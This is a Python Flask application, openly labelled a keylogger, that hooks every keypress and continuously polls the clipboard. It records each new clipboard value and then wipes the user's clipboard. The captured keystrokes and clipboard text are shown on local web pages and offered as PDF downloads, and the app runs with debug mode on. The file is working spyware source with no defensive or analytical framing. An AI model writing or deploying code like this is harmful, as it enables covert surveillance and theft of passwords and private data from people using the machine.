from flask import Flask, render_template, Response
import threading
import keyboard
import signal
import sys
import pyperclip
from io import BytesIO
from reportlab.lib.pagesizes import letter
from reportlab.pdfgen import canvas

app = Flask(__name__)

# Keylogger class to capture keystrokes and clipboard content
class Keylogger:
    def __init__(self):
        self.keystrokes = []
        self.clipboard_content = []
        self.running = True
        self.current_word = ''  # To store the current word being typed

    def start_logging(self):
        keyboard.on_press(self.on_key_press)
        keyboard.wait()  # Wait for a keyboard event indefinitely

    def on_key_press(self, event):
        key = event.name
        if key == 'space':
            if self.current_word:  # Check if current_word is not empty
                self.keystrokes.append(self.current_word)
            self.current_word = ''  # Reset the current word
        elif len(key) == 1:  # Filter out non-alphanumeric keys
            self.current_word += key
        else:
            # Capture all keys, including special keys, and add a special class to them
            self.keystrokes.append(f'<span class="special-key">{key}</span>') 

    def check_clipboard(self):
        prev_clipboard_content = None
        while self.running:
            new_clipboard_content = pyperclip.paste()
            if new_clipboard_content != prev_clipboard_content:
                self.clipboard_content.append(new_clipboard_content)
                prev_clipboard_content = new_clipboard_content
                pyperclip.copy('')  # Clear clipboard content

    def clear_keystrokes(self):
        self.keystrokes = []

    def get_clipboard_content(self):
        return self.clipboard_content
    
    def get_keystrokes(self):
        return self.keystrokes

# Create an instance of the Keylogger class
keylogger = Keylogger()

# Function to start the keylogger and clipboard monitor in separate threads
def start_keylogger():
    keylogger.start_logging()

def monitor_clipboard():
    keylogger.check_clipboard()

# Start the keylogger and clipboard monitor when the Flask application starts
keylogger_thread = threading.Thread(target=start_keylogger)
keylogger_thread.start()

clipboard_thread = threading.Thread(target=monitor_clipboard)
clipboard_thread.start()

# Signal handler to clear keystrokes and clipboard content when application is terminated
def signal_handler(sig, frame):
    keylogger.clear_keystrokes()
    keylogger.running = False
    sys.exit(0)

# Register the signal handler for SIGINT (Ctrl+C)
signal.signal(signal.SIGINT, signal_handler)

# Route to display logged keystrokes
@app.route('/')
def logged_keystrokes():
    keystrokes = keylogger.keystrokes
    return render_template('logged_keystrokes.html', title='Logged Keystrokes', keystrokes=keystrokes)

# Route to display clipboard content
@app.route('/clipboard_content')
def clipboard_content():
    clipboard_content = keylogger.get_clipboard_content()
    return render_template('clipboard.html', title='Clipboard Content', clipboard_content=clipboard_content)

# Route to generate and download PDF containing clipboard content
@app.route('/download_pdf')
def download_pdf():
    clipboard_content = keylogger.get_clipboard_content()
    pdf = generate_pdf(clipboard_content)
    return Response(pdf, mimetype='application/pdf', headers={'Content-Disposition': 'attachment;filename=clipboard_content.pdf'})


@app.route('/download_logs_as_pdf')
def download_logs():
    logs_content = keylogger.get_keystrokes()
    pdf = generate_pdf(logs_content)
    return Response(pdf, mimetype='application/pdf', headers={'Content-Disposition': 'attachment;filename=logs_content.pdf'})

    

# Function to generate PDF document
def generate_pdf(content):
    buffer = BytesIO()
    c = canvas.Canvas(buffer, pagesize=letter)
    y = 750
    for item in content:
        c.drawString(50, y, item)
        y -= 20
    c.save()
    pdf = buffer.getvalue()
    buffer.close()
    return pdf

if __name__ == '__main__':
    app.run(debug=True)



